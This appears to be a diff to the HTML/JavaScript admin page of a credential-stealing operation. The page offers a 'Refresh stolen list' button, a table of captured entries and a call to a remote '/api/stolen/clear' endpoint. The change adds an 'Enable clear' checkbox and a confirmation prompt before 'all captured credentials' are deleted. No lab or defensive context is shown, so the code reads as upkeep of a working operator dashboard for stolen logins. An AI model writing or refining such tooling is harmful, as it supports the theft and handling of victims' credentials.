@@ -30,7 +30,11 @@
   <input id="apiBase" placeholder="https://web-production-682ba.up.railway.app" value="https://web-production-682ba.up.railway.app" />
 
   <button onclick="refresh()">Refresh stolen list</button>
-  <button class="secondary" onclick="clearAll()">Clear</button>
+  <button class="secondary" onclick="clearAll()">Clear (danger)</button>
+  <label style="display:inline; margin-left:8px; font-size:13px;">
+    <input type="checkbox" id="enableClear" style="width:auto; margin:0 4px 0 0;" onchange="toggleClear()" />
+    Enable clear
+  </label>
 
   <p id="status"></p>
   <table>
@@ -83,13 +87,26 @@
       }
     }
 
+    function toggleClear() {
+      const on = document.getElementById('enableClear').checked;
+      document.querySelector('button.secondary').disabled = !on;
+    }
+
     async function clearAll() {
       const b = base();
       if (!b) return;
+      if (!document.getElementById('enableClear').checked) {
+        document.getElementById('status').textContent = 'Clear disabled — tick "Enable clear" first';
+        return;
+      }
+      if (!confirm('DELETE all captured credentials permanently? This cannot be undone.')) return;
       await fetch(b + '/api/stolen/clear', { method: 'POST' });
+      document.getElementById('enableClear').checked = false;
+      toggleClear();
       refresh();
     }
 
+    toggleClear();
     refresh();
   </script>
 </body>
